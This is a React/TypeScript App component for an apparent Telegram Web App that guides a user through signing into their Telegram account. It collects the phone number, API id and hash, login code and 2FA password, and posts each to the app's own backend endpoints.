
import React, { useState, useEffect } from 'react';
import WelcomeScreen from './components/WelcomeScreen';
import AuthScreen from './components/AuthScreen';
import CodeScreen from './components/CodeScreen';
import PasswordScreen from './components/PasswordScreen';
import SuccessScreen from './components/SuccessScreen';

export type Screen = 'welcome' | 'auth' | 'code' | 'password' | 'success';

export interface AuthSettings {
    apiId: string;
    apiHash: string;
    phoneNumber: string;
    proxy: string;
}

const App: React.FC = () => {
  const [screen, setScreen] = useState<Screen>('welcome');
  const [cameFrom2FA, setCameFrom2FA] = useState(false);
  
  // State for API interaction
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [userId, setUserId] = useState<number | null>(null);
  const [authData, setAuthData] = useState<{
    phoneNumber: string;
    phoneCodeHash: string;
  } | null>(null);
  const [passwordHint, setPasswordHint] = useState<string | undefined>(undefined);

  useEffect(() => {
    // Mock user ID for development if Telegram Web App is not available
    const tg = (window as any).Telegram?.WebApp;
    if (tg?.initDataUnsafe?.user?.id) {
        setUserId(tg.initDataUnsafe.user.id);
    } else {
        console.warn("Telegram Web App user ID not found. Using mock ID 12345 for development.");
        setUserId(12345);
    }
  }, []);

  const resetError = () => setError(null);

  const handleNavigateToAuth = () => {
    resetError();
    setScreen('auth');
  };
  
  const handleNavigateBackToAuth = () => {
    resetError();
    setScreen('auth');
  };
  
  const handleNavigateBackToCode = () => {
    resetError();
    setScreen('code');
  };

  const handleSendCode = async (settings: AuthSettings) => {
    if (!userId) {
        setError("User ID not available. Cannot proceed.");
        return;
    }
    setIsLoading(true);
    resetError();

    try {
        // In a real scenario, you would fetch from your backend URL e.g., 'https://your-backend.com/api/auth/send_code'
        const response = await fetch('/api/auth/send_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                phone_number: settings.phoneNumber,
                api_id: settings.apiId,
                api_hash: settings.apiHash,
                user_id: userId,
            }),
        });
        
        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.message || 'Не удалось отправить код.');
        }

        if (data.status === 'code_sent') {
            setAuthData({
                phoneNumber: data.phone_number,
                phoneCodeHash: data.phone_code_hash,
            });
            setScreen('code');
        } else {
            throw new Error(data.message || 'Произошла неизвестная ошибка.');
        }
    } catch (err: any) {
        setError(err.message);
    } finally {
        setIsLoading(false);
    }
  };
  
  const handleCodeVerification = async (code: string) => {
    if (!authData || !userId) {
        setError("Authentication data is missing. Please start over.");
        return;
    }
    setIsLoading(true);
    resetError();
    
    try {
        const response = await fetch('/api/auth/sign_in', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                code,
                phone_number: authData.phoneNumber,
                phone_code_hash: authData.phoneCodeHash,
                user_id: userId,
            }),
        });

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.message || 'Не удалось проверить код.');
        }

        if (data.status === 'authorized') {
            setCameFrom2FA(false);
            setScreen('success');
        } else if (data.status === '2fa_required') {
            setPasswordHint(data.hint);
            setScreen('password');
        } else {
            throw new Error(data.message || 'Неверный ответ от сервера.');
        }
    } catch (err: any) {
        setError(err.message);
    } finally {
        setIsLoading(false);
    }
  };

  const handlePasswordConfirmation = async (password: string) => {
    if (!authData || !userId) {
        setError("Authentication data is missing. Please start over.");
        return;
    }
    setIsLoading(true);
    resetError();
    
    try {
        const response = await fetch('/api/auth/check_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                password,
                phone_number: authData.phoneNumber,
                user_id: userId,
            }),
        });

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.message || 'Не удалось проверить пароль.');
        }

        if (data.status === 'authorized') {
            setCameFrom2FA(true);
            setScreen('success');
        } else {
            throw new Error(data.message || 'Неверный ответ от сервера.');
        }
    } catch (err: any) {
        setError(err.message);
    } finally {
        setIsLoading(false);
    }
  };


  return (
    <div className="bg-gray-900 min-h-screen text-gray-100" style={{ fontFamily: 'System UI, Roboto, Open Sans, sans-serif' }}>
      {screen === 'welcome' && <WelcomeScreen onStart={handleNavigateToAuth} />}
      {screen === 'auth' && <AuthScreen onSendCode={handleSendCode} isLoading={isLoading} error={error} />}
      {screen === 'code' && <CodeScreen onBack={handleNavigateBackToAuth} onVerify={handleCodeVerification} isLoading={isLoading} error={error} />}
      {screen === 'password' && <PasswordScreen onBack={handleNavigateBackToCode} onConfirm={handlePasswordConfirmation} passwordHint={passwordHint} isLoading={isLoading} error={error} />}
      {screen === 'success' && <SuccessScreen from2FA={cameFrom2FA} />}
    </div>
  );
};

export default App;
